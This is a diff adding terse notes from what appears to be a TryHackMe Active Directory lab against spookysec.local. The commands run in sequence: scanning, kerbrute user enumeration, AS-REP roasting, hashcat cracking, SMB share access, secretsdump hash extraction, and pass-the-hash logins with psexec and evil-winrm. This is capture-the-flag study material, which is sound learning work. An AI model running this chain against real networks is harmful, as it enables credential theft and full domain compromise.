@@ -1,0 +1,21 @@
+nmap -Pn 10.10.68.12
+nmap -A 10.10.68.12
+Enumeration
+./kerbrute userenum --dc spookysec.local -d spookysec.local '/root/Desktop/tryhackme stuff/attacktive/kerbruteuser.txt' -t 100
+
+GetNUPsers.py -dc-ip 10.10.68.12 spookysec.local/svc-admin -no-ass
+
+ hashcat -m 18200 -a 0 /root/Desktop/tocrack /root/Desktop/passes/rockyou.txt --force
+or John
+
+smbclient -L 10.10.68.12 -U 'svc-admin'; 
+
+smbclient \\\\10.10.68.12\\backup -U 'svc-admin' 
+
+secretsdump.py -just-dc backup@spookysec.local
+
+psexec.py -hashes inserthashes administrator@spookysec.local
+
+evil-winrm -u administrator -H inserthash -i 10.10.68.12
+
+
